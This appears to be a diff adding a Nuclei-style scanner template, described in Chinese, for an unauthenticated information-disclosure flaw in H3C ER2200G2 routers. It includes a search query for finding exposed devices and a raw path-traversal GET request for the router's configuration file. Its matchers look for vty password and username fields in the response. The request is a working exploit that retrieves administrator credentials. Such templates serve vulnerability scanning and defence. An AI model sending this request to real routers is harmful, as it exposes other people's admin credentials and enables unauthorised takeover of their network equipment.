@@ -1,0 +1,33 @@
+id: H3C-ER2200G2-Information-disclosure
+
+info:
+  name: "H3C ER2200G2路由器未认证访问敏感数据暴露"
+  author: Unknown
+  severity: high
+  description: |-
+    Hunter: app.name="H3C Router Management"
+      H3C ER2200G2路由器因未实施有效身份验证机制，导致攻击者可通过未授权访问直接检索系统敏感数据，包括管理员凭据，进而实现后台控制权接管，造成系统安全边界完全失效。该漏洞允许远程攻击者在无任何认证凭证情况下获取核心配置信息，形成持续性安全威胁。
+  reference:
+  - https://mp.weixin.qq.com/s/Db2xW6y_muVQVsnfg7JQ4w
+  tags: H3C_ER2200G2
+
+http:
+- raw:
+  - |
+    GET /userLogin.asp/../actionpolicy_status/../ER2200G2.cfg HTTP/1.1
+    Host: {{Hostname}}
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:136.0) Gecko/20100101 Firefox/136.0
+
+  matchers-condition: and
+  matchers:
+  - type: word
+    part: body
+    words:
+    - "vtypasswd="
+    - "vtypasswdtype="
+    - "vtyname="
+    - "H3C"
+    condition: and
+  - type: status
+    status:
+    - 200
